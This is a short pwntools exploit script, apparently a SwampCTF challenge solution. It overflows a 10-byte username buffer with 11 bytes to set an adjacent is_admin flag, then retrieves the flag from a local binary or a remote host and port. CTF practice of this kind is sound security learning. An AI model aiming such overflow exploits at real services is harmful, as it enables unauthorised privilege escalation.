from pwn import *
import argparse
import sys

# Constants
OVERFLOW_INPUT = b"A" * 11  # 10 for username + 1 byte to set is_admin=true

def get_flag(io):
    """
    Send overflow input and extract flag.
    """
    io.sendline(OVERFLOW_INPUT)  # Overflow username + set is_admin = true
    io.recvuntil(b"flag? (y/n) ")
    io.sendline(b"y")

    # Try to extract the flag
    try:
        line = io.recvline(timeout=2)
        if b"swamp" in line.lower():
            print("[+] Flag:", line.decode().strip())
        else:
            print("[!] Unexpected output:", line.decode().strip())
    except EOFError:
        print("[-] Failed to receive flag output.")

def run_local(path):
    """
    Launch local binary process.
    """
    print(f"[*] Running locally: {path}")
    elf = ELF(path)
    context.binary = elf
    return process(path)

def run_remote(host, port):
    """
    Connect to remote service.
    """
    print(f"[*] Connecting to {host}:{port}")
    return remote(host, port)

def main():
    parser = argparse.ArgumentParser(description="SwampCTF - is_admin exploit")
    subparsers = parser.add_subparsers(dest="mode", required=True)

    # --local ./binary
    local_parser = subparsers.add_parser("local", help="Run exploit locally")
    local_parser.add_argument("binary", type=str, help="Path to local binary")

    # --remote
    remote_parser = subparsers.add_parser("remote", help="Run exploit remotely")
    remote_parser.add_argument("ip", type=str, help="Remote IP or hostname")
    remote_parser.add_argument("port", type=int, help="Remote port")

    args = parser.parse_args()

    # Setup target
    if args.mode == "local":
        io = run_local(args.binary)
    elif args.mode == "remote":
        io = run_remote(args.ip, args.port)
    else:
        print("[-] Unknown mode")
        sys.exit(1)

    get_flag(io)
    io.close()

if __name__ == "__main__":
    main()

